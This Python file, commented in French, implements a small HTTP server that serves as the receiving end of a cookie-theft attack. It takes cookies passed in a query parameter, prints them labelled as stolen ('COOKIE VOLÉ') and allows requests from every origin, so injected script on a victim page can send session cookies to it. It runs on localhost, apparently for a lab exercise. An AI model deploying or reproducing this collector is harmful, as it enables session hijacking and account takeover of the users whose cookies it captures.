from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

class CORSRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Récupère les paramètres
        query = urlparse(self.path).query
        params = parse_qs(query)
        
        # Traite les cookies reçus
        if 'cookie' in params:
            print("\n[COOKIE VOLÉ]:", params['cookie'][0])
        
        # En-têtes CORS pour autoriser toutes les origines (à adapter en production)
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET')
        self.send_header('Access-Control-Allow-Headers', 'Content-type')
        self.end_headers()
        
        # Réponse (optionnelle)
        self.wfile.write(b'Cookie received')

if __name__ == '__main__':
    server = HTTPServer(('localhost', 8001), CORSRequestHandler)
    print("Serveur CORS actif sur http://localhost:8001")
    server.serve_forever()